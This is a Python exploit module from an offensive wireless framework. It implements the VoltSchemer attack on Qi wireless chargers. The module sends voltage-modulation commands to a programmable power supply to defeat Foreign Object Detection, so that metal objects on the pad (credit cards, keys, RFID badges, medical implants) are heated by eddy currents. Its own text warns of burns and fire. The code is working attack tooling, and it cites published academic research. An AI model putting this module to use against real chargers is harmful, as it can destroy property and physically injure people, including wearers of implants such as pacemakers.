# Author: André Henrique (LinkedIn/X: @mrhenrike)
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """VoltSchemer: Foreign Object Destruction via FOD Bypass.

    Qi chargers include Foreign Object Detection (FOD) to stop
    charging when metallic objects (coins, keys, credit cards,
    paper clips, medical implants) are detected on the pad.
    VoltSchemer bypasses FOD by manipulating the charger's supply
    voltage to mask the impedance changes that trigger detection.

    With FOD disabled, the charger continues to energize its coil
    at full power, inducing eddy currents in metallic objects on
    the pad.  This can heat metal objects to dangerous temperatures,
    potentially damaging credit cards, RFID badges, medical
    implants (pacemakers), or causing burns.

    Hardware requirements:
    - Modified Qi charger with exposed power lines
    - Programmable power supply (same as VoltSchemer overheating)
    - Impedance measurement probe (optional, for FOD analysis)
    - Safety: heat-resistant surface, metal tongs, fire extinguisher

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "VoltSchemer: Foreign Object Destruction via FOD Bypass",
        "description": (
            "Bypasses Qi charger Foreign Object Detection (FOD) by "
            "manipulating supply voltage to mask impedance changes. "
            "Metallic objects on the pad (credit cards, keys, medical "
            "implants) are exposed to intense magnetic fields, causing "
            "eddy current heating and potential destruction.  Requires "
            "modified Qi charger with programmable power supply.  "
            "Safety hazard: can cause burns and fire."
        ),
        "authors": (
            "Zihao Zhan et al. (University of Florida, VoltSchemer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
            "https://voltschemer.com/",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Qi chargers with bypassable FOD mechanisms",
            "Metallic objects on charging pad (cards, keys, implants)",
        ),
    }

    target = OptIP("", "Target charger description")
    port = OptPort(1, "Not used (electromagnetic attack)")
    timeout = OptFloat(30.0, "FOD bypass duration in seconds")
    psu_device = OptString("simulate", "Power supply serial device or 'simulate'")
    fod_bypass_voltage = OptFloat(9.0, "Voltage to mask FOD detection (V)")
    modulation_freq = OptFloat(1000.0, "Voltage modulation frequency to mask FOD (Hz)")
    modulation_amplitude = OptFloat(0.5, "Voltage modulation amplitude (V)")

    _QI_FOD_THRESHOLD_PERCENT = 5.0

    def _calculate_fod_mask_params(self) -> dict:
        """Calculate voltage modulation to mask FOD impedance signature."""
        return {
            "base_voltage": float(self.fod_bypass_voltage),
            "mod_freq": float(self.modulation_freq),
            "mod_amp": float(self.modulation_amplitude),
            "fod_threshold": self._QI_FOD_THRESHOLD_PERCENT,
        }

    def _apply_fod_bypass(self) -> bool:
        params = self._calculate_fod_mask_params()
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "wb") as f:
                cmd = (
                    f"VSET:{params['base_voltage']:.2f};"
                    f"MOD:SINE:{params['mod_freq']:.0f}:{params['mod_amp']:.2f};"
                    f"OUT:ON\n"
                )
                f.write(cmd.encode())
            return True
        except OSError:
            return False

    def _disable_output(self) -> bool:
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "wb") as f:
                f.write(b"OUT:OFF\n")
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        if str(self.psu_device) == "simulate":
            return True
        try:
            with open(str(self.psu_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        print_success(
            f"VoltSchemer FOD bypass: {self.fod_bypass_voltage}V, "
            f"modulation {self.modulation_freq}Hz +/- {self.modulation_amplitude}V"
        )
        self._exploit()

    def _exploit(self) -> None:
        params = self._calculate_fod_mask_params()
        print_status(
            f"Applying FOD bypass: {params['base_voltage']}V with "
            f"{params['mod_freq']}Hz modulation (+/- {params['mod_amp']}V) "
            f"to mask FOD impedance threshold ({params['fod_threshold']}%)"
        )

        if not self._apply_fod_bypass():
            print_error("Failed to apply FOD bypass voltage")
            return

        print_info(
            f"FOD detection bypassed. Charger coil energized at "
            f"{params['base_voltage']}V for {self.timeout}s. "
            "Any metallic objects on the pad will experience "
            "eddy current heating."
        )

        start = time.monotonic()
        while time.monotonic() - start < float(self.timeout):
            remaining = float(self.timeout) - (time.monotonic() - start)
            time.sleep(min(5.0, remaining))
            if remaining <= 0:
                break

        self._disable_output()
        print_success(
            "FOD bypass attack complete. Metallic objects on the "
            "charging pad were exposed to unregulated magnetic "
            "fields for the attack duration. Check for heat damage "
            "to credit cards, RFID badges, or other metallic items."
        )
